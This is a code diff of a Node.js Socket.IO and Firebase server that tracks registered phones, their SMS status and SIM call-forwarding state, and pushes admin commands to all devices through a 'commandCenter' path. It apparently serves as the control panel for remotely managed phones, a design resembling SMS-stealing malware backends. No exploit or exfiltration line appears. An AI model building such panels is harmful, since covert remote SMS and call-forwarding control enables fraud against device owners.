@@ -12,10 +12,9 @@ import { Server } from "socket.io";
 
 import { firestore, rtdb, fcm } from "./config/db.js";
 
-// ROUTES
 import adminRoutes from "./routes/adminRoutes.js";
 import notificationRoutes from "./routes/notificationRoutes.js";
-import checkRoutes from "./routes/checkRoutes.js";   // ⭐ YOUR NEW ROUTES ADDED
+import checkRoutes from "./routes/checkRoutes.js";
 import commandRoutes from "./routes/commandRoutes.js";
 
 const PORT = process.env.PORT || 5000;
@@ -97,7 +96,7 @@ async function refreshDevicesLive(reason = "") {
   try {
     const devices = await buildDevicesList();
 
-    lastDevicesList = devices;
+    lastDevicesList = devices; // ⭐ Store latest in memory
 
     io.emit("devicesLive", {
       success: true,
@@ -113,16 +112,19 @@ async function refreshDevicesLive(reason = "") {
 }
 
 /* ======================================================
-      SOCKET.IO CONNECTION HANDLING
+      SOCKET.IO CONNECTION HANDLING  ✅ FIXED
 ====================================================== */
 io.on("connection", async (socket) => {
   console.log("🔗 Client Connected:", socket.id);
 
   let currentDeviceId = null;
 
+  // ⭐ FIX: always send a fresh devices list on new connection
   try {
     const initialDevices =
-      lastDevicesList.length > 0 ? lastDevicesList : await buildDevicesList();
+      lastDevicesList && lastDevicesList.length
+        ? lastDevicesList
+        : await buildDevicesList();
 
     socket.emit("devicesLive", {
       success: true,
@@ -156,26 +158,27 @@ io.on("connection", async (socket) => {
 
     io.emit("deviceStatus", { id, connectivity: "Online" });
 
+    // Refresh live list for all clients
     refreshDevicesLive(`deviceOnline:${id}`);
   });
 
   /* ========== DISCONNECT ========== */
   socket.on("disconnect", async () => {
     console.log("🔌 Client Disconnected:", socket.id);
-    if (!currentDeviceId) return;
+    if (currentDeviceId) {
+      await rtdb.ref(`status/${currentDeviceId}`).set({
+        connectivity: "Offline",
+        lastSeen: Date.now(),
+        timestamp: Date.now(),
+      });
 
-    await rtdb.ref(`status/${currentDeviceId}`).set({
-      connectivity: "Offline",
-      lastSeen: Date.now(),
-      timestamp: Date.now(),
-    });
+      io.emit("deviceStatus", {
+        id: currentDeviceId,
+        connectivity: "Offline",
+      });
 
-    io.emit("deviceStatus", {
-      id: currentDeviceId,
-      connectivity: "Offline",
-    });
-
-    refreshDevicesLive(`deviceOffline:${currentDeviceId}`);
+      refreshDevicesLive(`deviceOffline:${currentDeviceId}`);
+    }
   });
 });
 
@@ -219,6 +222,8 @@ function startReplyWatcher(uid) {
 
   ref.on("value", (snap) => {
     if (!snap.exists()) {
+      console.log("📭 brosReply empty for:", uid);
+
       io.emit("brosReplyUpdate", {
         uid,
         success: true,
@@ -242,18 +247,16 @@ function startReplyWatcher(uid) {
   console.log("🎧 Reply watcher started:", uid);
 }
 
+// API: Start live reply listening
 app.get("/api/brosreply/:uid", async (req, res) => {
   try {
-    const uid = req.params.uid;
+    const uid = clean(req.params.uid);
 
-    // stop previous listener if any
     stopReplyWatcher(uid);
 
-    // send initial data once
     const snap = await rtdb.ref(`checkOnline/${uid}`).get();
     const data = snap.exists() ? { uid, ...snap.val() } : null;
 
-    // then start live listening
     startReplyWatcher(uid);
 
     return res.json({
@@ -268,93 +271,161 @@ app.get("/api/brosreply/:uid", async (req, res) => {
 });
 
 /* ======================================================
-      SMS & SIM-FORWARD LIVE SECTIONS
+      ⭐ SMS-STATUS LIVE SECTION
+      (router.get("/device/:uid/sms-status", getSmsStatusByDevice))
 ====================================================== */
-const smsLiveWatchers = new Map();
-const simForwardWatchers = new Map();
+const smsStatusWatchers = new Map();
 
-/* ---------- SMS STATUS LIVE LISTENER ---------- */
-function startSmsLive(uid) {
-  const ref = rtdb.ref(`commandCenter/smsStatus/${uid}`);
+function stopSmsStatusWatcher(uid) {
+  if (smsStatusWatchers.has(uid)) {
+    const ref = smsStatusWatchers.get(uid);
+    ref.off();
+    smsStatusWatchers.delete(uid);
+    console.log("🛑 SMS status watcher stopped:", uid);
+  }
+}
+
+function startSmsStatusWatcher(uid) {
+  // 👉 Apne RTDB ka path adjust kar sakta hai yahan:
+  const ref = rtdb.ref(`smsStatus/${uid}`);
 
   ref.on("value", (snap) => {
     if (!snap.exists()) {
-      console.log("⚪ SMS-STATUS EMPTY →", uid);
+      console.log("📭 SMS status empty for:", uid);
+
       io.emit("smsStatusUpdate", {
         uid,
         success: true,
-        data: [],
-        message: "No SMS status",
+        data: null,
+        message: "No SMS status found",
       });
       return;
     }
 
-    const raw = snap.val();
-    const list = [];
-
-    Object.entries(raw).forEach(([smsId, obj]) => {
-      list.push({
-        smsId,
-        uid,
-        ...obj,
-      });
-    });
-
-    list.sort((a, b) => (b.at || 0) - (a.at || 0));
-
-    console.log("🔥 LIVE SMS STATUS:", uid, list);
+    const data = snap.val();
+    console.log("📩 LIVE SMS status:", uid, data);
 
     io.emit("smsStatusUpdate", {
       uid,
       success: true,
-      data: list,
+      data: { uid, ...data },
     });
   });
 
-  smsLiveWatchers.set(uid, ref);
-  console.log("🎧 SMS Live watcher started →", uid);
+  smsStatusWatchers.set(uid, ref);
+  console.log("🎧 SMS status watcher started:", uid);
 }
 
-/* ---------- SIM FORWARD LIVE LISTENER ---------- */
-function startSimForwardLive(uid) {
-  const ref = rtdb.ref(`simForwardStatus/${uid}`);
+/**
+ * HTTP API:
+ *   GET /api/device/:uid/sms-status
+ * Frontend:
+ *   1) Ek baar current snapshot milega
+ *   2) Aage ka sab live Socket.IO event "smsStatusUpdate" se aayega
+ */
+app.get("/api/device/:uid/sms-status", async (req, res) => {
+  try {
+    const uid = clean(req.params.uid);
+    console.log("🌐 /api/device/:uid/sms-status HIT →", uid);
+
+    // Pehle purana watcher band
+    stopSmsStatusWatcher(uid);
+
+    // Pehle snapshot
+    const snap = await rtdb.ref(`smsStatus/${uid}`).get();
+    const data = snap.exists() ? { uid, ...snap.val() } : null;
+
+    // Ab live watcher start
+    startSmsStatusWatcher(uid);
+
+    return res.json({
+      success: true,
+      data,
+      message: "Live SMS status listening started",
+    });
+  } catch (err) {
+    console.error("❌ sms-status ERROR:", err.message);
+    res.status(500).json({ success: false });
+  }
+});
+
+/* ======================================================
+      ⭐ SIM-FORWARD LIVE SECTION
+      (router.get("/device/:uid/sim-forward", getSimForwardStatus))
+====================================================== */
+const simForwardWatchers = new Map();
+
+function stopSimForwardWatcher(uid) {
+  if (simForwardWatchers.has(uid)) {
+    const ref = simForwardWatchers.get(uid);
+    ref.off();
+    simForwardWatchers.delete(uid);
+    console.log("🛑 SIM forward watcher stopped:", uid);
+  }
+}
+
+function startSimForwardWatcher(uid) {
+  // 👉 Apne RTDB ka path adjust kar sakta hai yahan:
+  const ref = rtdb.ref(`simForward/${uid}`);
 
   ref.on("value", (snap) => {
     if (!snap.exists()) {
-      console.log("⚪ SIM-FORWARD EMPTY →", uid);
+      console.log("📭 SIM forward empty for:", uid);
+
       io.emit("simForwardUpdate", {
         uid,
         success: true,
-        data: [],
-        message: "No SIM forward status",
+        data: null,
+        message: "No SIM forward status found",
       });
       return;
     }
 
-    const raw = snap.val();
-    const list = [];
-
-    Object.entries(raw).forEach(([slot, obj]) => {
-      list.push({
-        simSlot: Number(slot),
-        ...obj,
-      });
-    });
-
-    list.sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
-
-    console.log("🔥 LIVE SIM-FORWARD:", uid, list);
+    const data = snap.val();
+    console.log("📡 LIVE SIM forward:", uid, data);
 
     io.emit("simForwardUpdate", {
       uid,
       success: true,
-      data: list,
+      data: { uid, ...data },
     });
   });
 
   simForwardWatchers.set(uid, ref);
-  console.log("🎧 SIM Forward watcher started →", uid);
+  console.log("🎧 SIM forward watcher started:", uid);
 }
+
+/**
+ * HTTP API:
+ *   GET /api/device/:uid/sim-forward
+ * Frontend:
+ *   - Snapshot + live updates via "simForwardUpdate"
+ */
+app.get("/api/device/:uid/sim-forward", async (req, res) => {
+  try {
+    const uid = clean(req.params.uid);
+    console.log("🌐 /api/device/:uid/sim-forward HIT →", uid);
+
+    // Pehle purana watcher band
+    stopSimForwardWatcher(uid);
+
+    // Snapshot
+    const snap = await rtdb.ref(`simForward/${uid}`).get();
+    const data = snap.exists() ? { uid, ...snap.val() } : null;
+
+    // Live watcher
+    startSimForwardWatcher(uid);
+
+    return res.json({
+      success: true,
+      data,
+      message: "Live SIM forward listening started",
+    });
+  } catch (err) {
+    console.error("❌ sim-forward ERROR:", err.message);
+    res.status(500).json({ success: false });
+  }
+});
 
 /* ======================================================
       ADMIN UPDATE → PUSH TO ALL DEVICES
@@ -363,6 +434,7 @@ rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
   if (!snap.exists()) return;
 
   const adminData = snap.val();
+  console.log("🛠 Admin updated:", adminData);
 
   const all = await rtdb.ref("registeredDevices").get();
   if (!all.exists()) return;
@@ -434,12 +506,16 @@ async function handleCheckOnlineChange(snap) {
     timestamp: now,
   });
 
+  console.log(`♻️ RESET CLOCK UPDATED for ${uid} → ${now}`);
+
+  // 🔥 Send to frontend
   io.emit("deviceStatus", {
     id: uid,
     connectivity: "Online",
     lastSeen: now,
   });
 
+  // OLD CHECK LOGIC (FCM ping)
   const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
   const token = devSnap.val()?.fcmToken;
   if (!token) return;
@@ -490,6 +566,7 @@ app.get("/restart/:uid", async (req, res) => {
     const diff = Date.now() - Number(data.restartAt);
 
     if (diff > RESTART_EXPIRY) {
+      // Auto remove
       await rtdb.ref(`restart/${uid}`).remove();
       return res.json({ success: true, data: null });
     }
@@ -548,22 +625,33 @@ app.get("/api/lastcheck/:uid", async (req, res) => {
 });
 
 /* ======================================================
-      LIVE WATCHERS FOR REGISTERED DEVICES
+      LIVE WATCHERS FOR REGISTERED DEVICES (🔥 MAIN PART)
 ====================================================== */
+// Jaisi hi registeredDevices me naya device add / update / delete hoga,
+// sab dashboards ko fresh devices list mil jayega.
 const registeredDevicesRef = rtdb.ref("registeredDevices");
 
 registeredDevicesRef.on("child_added", () => {
   refreshDevicesLive("registered_added");
 });
+
 registeredDevicesRef.on("child_changed", () => {
   refreshDevicesLive("registered_changed");
 });
+
 registeredDevicesRef.on("child_removed", () => {
   refreshDevicesLive("registered_removed");
 });
 
+/* Optional: If you also want status changes to trigger full refresh:
+const statusRef = rtdb.ref("status");
+statusRef.on("child_changed", () => {
+  refreshDevicesLive("status_changed");
+});
+*/
+
 /* ======================================================
-      REST: GET DEVICES LIST
+      REST: GET DEVICES LIST (for HTTP usage)
 ====================================================== */
 app.get("/api/devices", async (req, res) => {
   try {
@@ -580,19 +668,22 @@ app.get("/api/devices", async (req, res) => {
 });
 
 /* ======================================================
-      INITIAL REFRESH & MAIN ROUTES
+      INITIAL REFRESH & ROUTES
 ====================================================== */
 refreshDevicesLive("initial");
 
 app.use(adminRoutes);
 app.use(notificationRoutes);
-app.use("/api", checkRoutes);      // ⭐ ALL NEW API ROUTES WORKING
+app.use("/api", checkRoutes);
 app.use(commandRoutes);
 
 app.get("/", (_, res) => {
-  res.send("RTDB + Socket.IO Backend Running");
+  res.send(" RTDB + Socket.IO Backend Running");
 });
 
+/* ======================================================
+      START SERVER
+====================================================== */
 server.listen(PORT, () => {
   console.log(`🚀 Server running on PORT ${PORT}`);
 });
